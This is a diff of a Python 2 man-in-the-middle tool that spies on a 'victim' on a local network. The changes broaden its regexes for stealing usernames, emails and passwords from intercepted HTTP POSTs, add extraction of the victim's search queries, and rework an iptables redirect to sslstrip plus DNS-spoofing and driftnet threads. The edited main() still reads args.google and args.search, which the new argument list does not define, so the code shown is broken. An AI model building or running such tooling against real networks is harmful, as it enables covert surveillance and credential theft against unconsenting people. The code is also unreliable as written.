@@ -23,13 +23,12 @@ if not os.geteuid()==0:
 
 #Create the arguments
 parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Use -uv to print all URLs.", action="store_true")
+parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also prints searches. Use -uv to print all URLs.", action="store_true")
 parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting.", action="store_true")
 parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
 parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
-parser.add_argument("-g", "--google", help="Print Google searches, and show nonHTTPS links they click on from the search results.", action="store_true")
-parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
-parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits.", action="store_true")
+parser.add_argument("-ssl", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
+parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits including possible searches.", action="store_true")
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
 parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames and passwords in unsecure HTTP POSTs", action="store_true")
 args = parser.parse_args()
@@ -104,6 +103,13 @@ def URL(pkt):
 			headers = pkt
 			body = ''
 
+		def search(url):
+			searched = re.search('((search|query|search\?q|\?s|&q)=([^&][^&]*))', url)
+			if searched:
+				searched = searched.group(3)
+				searched = searched.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
+				print colors.BLUE + '[+] Searched %s for:' % c[1],searched + colors.ENDC
+
 		post = re.search('POST /', headers)
 		get = re.search('GET /', headers)
 		host = re.search('Host: ', headers)
@@ -113,18 +119,18 @@ def URL(pkt):
 #gets truncated and sniff() then treats the other few lines of the HTTP load as a new packet for some reason.
 #http://bpaste.net/show/v2CsP4Ixzb7NGGuutDSp/
 		if args.post and len(headers) < 450 and not get:
-			username = re.finditer('(([Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
+			username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
 			password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
-			for x in username:
-				if x:
-					print colors.TAN,'[+] Packet was split by accident. Username Data:',headers, colors.ENDC
-					print colors.RED,x.group(),colors.ENDC
+			for u in username:
+				if u:
+					print colors.TAN,'[+] Packet was split by accident. Data:',headers, colors.ENDC
+					print colors.RED,u.group(),colors.ENDC
 					counter = 1
-			for y in password:
-				if y:
+			for p in password:
+				if p:
 					if counter == 0:
-						print colors.TAN, '[+] Packet was split by accident. Password data:', headers, colors.ENDC
-					print colors.RED, y.group(), colors.ENDC
+						print colors.TAN, '[+] Packet was split by accident. Data:', headers, colors.ENDC
+					print colors.RED, p.group(), colors.ENDC
 			counter = 0
 		if (post or get) and host:
 			a = headers.split(r"\r\n")
@@ -139,58 +145,22 @@ def URL(pkt):
 				if body != '':
 					print colors.TAN+'[+] POST:',url,'HTTP POST load:',body+colors.ENDC
 					password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
-					username = re.finditer('(([Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
-					if username:
-						for x in username:
-							print colors.RED,x.group(),colors.ENDC
-					if password:
-						for y in password:
-							print colors.RED,y.group(),colors.ENDC
+					username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
+					for u in username:
+						if u:
+							print colors.RED,u.group(),colors.ENDC
+					for p in password:
+						if p:
+							print colors.RED,p.group(),colors.ENDC
 			if args.urlspy:
 				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
 				if any(i in url for i in d):
 					return
 				print url
+				search(url)
 			if args.verboseURL:
 				print url
-			if args.google:
-				if 'google.com' in url:
-					r = re.findall(r'(?i)\&q=(.*?)\&', url)
-					if r:
-						search = r[0].split('&')[0]
-						search = search.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
-						print colors.BLUE + '[+] Googled:',search + colors.ENDC
-						try:
-							g,s = url.split('http%3A%2F%2F')
-							s = s.replace('%2F', '/').replace('%3F', '?').replace('%3D', '=')
-							s = s[:s.find('&')]
-							print colors.BLUE + '[+] Clicked this link from a Google search:',s + colors.ENDC
-						except:
-							pass
-
-
-
-
-
-#				bodyParsed = urlparse.parse_qs(body)
-#				print bodyParsed
-#				try:
-#					value = next(v for (k,v) in bodyParsed.iteritems() if passwd or username in k)
-#					print value
-#				except:
-#					print 'this post does not have username or password data'
-#				for k,v in bodyParsed.iteritems():
-#					if passwd or username in k:
-#						print bodyParsed[k]
-#			if args.post and post:
-#				print '%s POSTed to:' % victimIP, url
-#				print request
-#				username = re.search('([Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin)=[^&]*', request)
-#				if username:
-#					print username.group()
-#				else:
-#					print "Could not find username"
-
+				search(url)
 
 def DNSreq(pkt):
 	if pkt.haslayer(DNSQR):
@@ -228,7 +198,12 @@ class dnsspoof(threading.Thread):
 class sslstrip(threading.Thread):
 	def run(self):
 		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
+		ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
 		sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')
+
+class driftnet(threading.Thread):
+	def run(self):
+		driftnet = bash('xterm -e driftnet -i %s' % interface)
 
 print "Active interface = " + interface
 print "Router IP = " + routerIP
@@ -251,7 +226,7 @@ def main():
 	ipNATX = bash('iptables -t nat -X')
 	print 'Enabled IP forwarding and flushed the firewall\n'
 
-	if args.urlspy or args.google or args.verboseURL or args.post:
+	if args.urlspy or args.google or args.verboseURL or args.post or args.search:
 		ug = urlspy()
 		#Make sure the thread closes with the main program on Ctrl-C
 		ug.daemon = True
@@ -263,10 +238,11 @@ def main():
 		dt.start()
 
 	if args.driftnet:
-		driftnet = bash('xterm -e driftnet -i %s' % interface)
+		dr = driftnet()
+		dr.daemon = True
+		dr.start()
 
 	if args.sslstrip:
-		ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
 		ssl = sslstrip()
 		ssl.daemon = True
 		ssl.start()
